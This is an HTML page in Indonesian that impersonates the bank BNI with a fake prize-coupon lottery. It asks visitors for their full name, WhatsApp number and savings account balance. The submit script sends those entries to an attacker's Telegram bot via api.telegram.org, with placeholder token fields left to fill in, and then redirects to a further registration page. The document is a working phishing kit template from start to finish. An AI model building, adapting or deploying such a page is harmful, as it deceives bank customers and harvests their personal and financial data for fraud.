<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Pencetakan Kupon BNI</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body {
      background: linear-gradient(to bottom, #87CEFA, #ffffff);
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      background-image: url(background.png);
    }

    /* Navbar */
    .navbar {
      height: 90px;
      width: 100%;
      padding: 0;
      margin: 0;
    }
    .navbar-full-img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Carousel */
    .carousel-wrapper {
      background: url('belakangbni.png') no-repeat center top;
      background-size: cover;
      padding: 50px 0 20px;
      border-bottom-left-radius: 30px;
      border-bottom-right-radius: 30px;
    }
    .carousel {
      
      max-width: 370px;
      margin: auto;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .carousel-indicators [data-bs-target] {
      background-color: #007bff;
    }

    /* Animasi */
    @keyframes gradientShift {
      0% { background: linear-gradient(to right, #ff9a9e, #fad0c4); }
      25% { background: linear-gradient(to right, #a18cd1, #fbc2eb); }
      50% { background: linear-gradient(to right, #fbc2eb, #a6c1ee); }
      75% { background: linear-gradient(to right, #ffecd2, #fcb69f); }
      100% { background: linear-gradient(to right, #ff9a9e, #fad0c4); }
    }
    @keyframes slideIn {
      0% { opacity: 0; transform: translateX(100%); }
      100% { opacity: 1; transform: translateX(0); }
    }

    /* Form */
    .form-box {
      margin: 30px auto 10px;
      padding: 20px;
      border-radius: 15px;
      max-width: 370px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.15);
      background-color: #fff;
    }

    /* Text slider */
    .text-slider-container {
      width: 100%;
      overflow: hidden;
      border-bottom: 2px solid #eee;
      margin-bottom: 15px;
    }
    .text-slider {
      display: inline-block;
      white-space: nowrap;
      font-weight: bold;
      font-size: 16px;
      color: #ff5a2d;
      padding: 8px 0;
      animation: slideText 12s linear infinite;
    }
    @keyframes slideText {
      0% { transform: translateX(100%); }
      80% { transform: translateX(-100%); }
      100% { transform: translateX(-120%); } /* kasih jarak renggang */
    }

    /* Form field */
    .form-label {
      font-weight: bold;
      color: #333;
    }
    input.form-control, select.form-select {
      border: 2px solid #ddd;
      border-radius: 10px;
      padding: 10px;
    }

    /* Tombol Submit */
    .btn-submit {
      width: 100%;
      padding: 12px;
      background: #ff5a2d;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      transition: background 0.3s ease;
    }
    .btn-submit:hover {
      background: #e6451c;
    }

    /* Responsive */
    @media (max-width: 576px) {
      .form-box { padding: 15px; }
      .text-slider { font-size: 14px; }
      input.form-control { padding: 8px; font-size: 14px; }
      .btn-submit { padding: 10px; font-size: 15px; }
    }
    @media (max-width: 480px) {
      /* perbaikan selector yang sebelumnya bikin gambar mengecil */
      .navbar { height: 80px; }
      .navbar-full-img { object-fit: contain; }
    }
.text-slider {
  white-space: nowrap;
  overflow: hidden;
  display: block;
  position: relative;
  font-weight: bold;
  color: #333;          /* warna tulisan */
  background: transparent !important; /* biar gak ada background */
  animation: slideText 10s linear infinite;
}

/* Animasi jalan dari kanan ke kiri */
@keyframes slideText {
  0% {
    transform: translateX(100%);
  }
  100% {
    transform: translateX(-100%);
  }
}

    /* =========================
       OVERRIDE: Bikin slider gede & full-fit
       (tanpa menghapus kode lama)
    ==========================*/
 
    /* pastikan semua gambar di item ngepas penuh */
    .carousel-item img,
    .carousel-img {
      width: 100%;
        padding: 0 10px;   /* kasih jarak kanan kiri */

      height: 100%;
      object-fit: cover;   /* zoom crop rapi, tanpa gepeng */
      display: block;
    }
    /* sudut membulat tetap rapi */
    .carousel-item img { border-radius: 10px; }
  </style>
</head>
<body>

<!-- NAVBAR -->
<div class="navbar">
  <img src="headerbni.png" alt="Logo BNI" class="navbar-full-img">
</div>

<!-- CAROUSEL -->
<div class="carousel-wrapper">
  <div id="promoCarousel" class="carousel slide" data-bs-ride="carousel">
    <div class="carousel-inner text-center">
      <div class="carousel-item active" data-bs-interval="2000">
        <img src="banner4img1.png" class="carousel-img" alt="Promo 1">
      </div>
      <div class="carousel-item" data-bs-interval="2000">
        <img src="babannerimg1.jpg" class="carousel-img" alt="Promo 2">
      </div>
      <div class="carousel-item" data-bs-interval="2000">
        <img src="bannerimg3.jpg" class="carousel-img" alt="Promo 3">
      </div>
    </div>
  </div>
</div>

<!-- FORM -->
<div class="form-box">
  <div class="text-slider-container">
    <div class="text-slider">
      <span>Silahkan lengkapi kupon undian dibawah ini</span>
    </div>
  </div>

  <form id="brimoForm">
    <div class="mb-3">
      <label for="kupon" class="form-label">Pilih Kupon</label>
      <select id="kupon" class="form-select" required>
        <option value="">PILIH KUPON</option>
        <option value="1">PAKET UMROH TIKET LIBURAN</option>
        <option value="2">UANG CASH & EMAS</option>
        <option value="3">Mobil & Motor</option>
      </select>
    </div>
    <div class="mb-3">
      <label for="namaLengkap" class="form-label">Nama Lengkap:</label>
      <input type="text" id="namaLengkap" class="form-control" placeholder="Masukkan Nama Lengkap" required />
    </div>
    <div class="mb-3">
      <label for="nomorHp" class="form-label">Nomor WhatsApp:</label>
      <input type="tel" id="nomorHp" class="form-control" placeholder="Masukkan Nomor Handphone" required>
    </div>
    <div class="mb-3">
      <label for="saldo" class="form-label">Saldo Rekening Tabungan saat ini:</label>
      <input type="text" id="saldo" class="form-control" placeholder="Rp.xxx" required />
    </div>
  </form>
</div>

<style>
/* Container teks biar rapi */
.text-slider-container {
  width: 100%;
  overflow: hidden;
  white-space: nowrap;
  box-sizing: border-box;
  border-bottom: 2px solid #ddd;
  margin-bottom: 15px;
}

/* Teks jalan */
.text-slider {
  display: inline-block;
  padding-left: 100%; /* mulai dari kanan */
  animation: slideText 12s linear infinite;
}

.text-slider span {
  font-size: 18px;
  font-weight: bold;
  color: #333;
}

/* Animasi jalan */
@keyframes slideText {
  0% {
    transform: translateX(0%);
  }
  100% {
    transform: translateX(-100%);
  }
}
</style>

<!-- Submit button diluar card -->
<div style="max-width:370px;margin:10px auto 30px;">
  <button type="submit" form="brimoForm" class="btn-submit">CETAK KUPON</button>
</div>

<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
  document.getElementById("brimoForm").addEventListener("submit", function(event) {
    event.preventDefault();
    let kupon = document.getElementById("kupon").value.trim();
    let nama = document.getElementById("namaLengkap").value.trim();
    let noHp = document.getElementById("nomorHp").value.trim();
    let saldo = document.getElementById("saldo").value.trim();

    if (kupon === "" || nama === "" || noHp === "" || saldo === "") {
      alert("Semua kolom wajib diisi.");
      return;
    }

    let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
    let message = `📝 *Pendaftaran Kupon BNI*\n\n🎟 Kupon: ${kupon}\n👤 Nama: ${nama}\n📱 Nomor HP: ${noHp}\n💰 Saldo Akhir: Rp ${saldoFormatted}`;

    let botToken = "ISI_TOKENMU";
    let chatId = "ISI_CHATIDMU";

    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    fetch(url)
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert("Data berhasil dikirim!");
          window.location.href = "registrasi.html";
        } else {
          alert("Gagal mengirim ke Telegram.");
        }
      })
      .catch(error => {
        alert("Terjadi kesalahan jaringan: " + error);
      });
  });

  // Auto play carousel
  const carousel = document.querySelector('#promoCarousel');
  new bootstrap.Carousel(carousel, {
    interval: 2000,
    ride: 'carousel'
  });
</script>
</body>
</html>
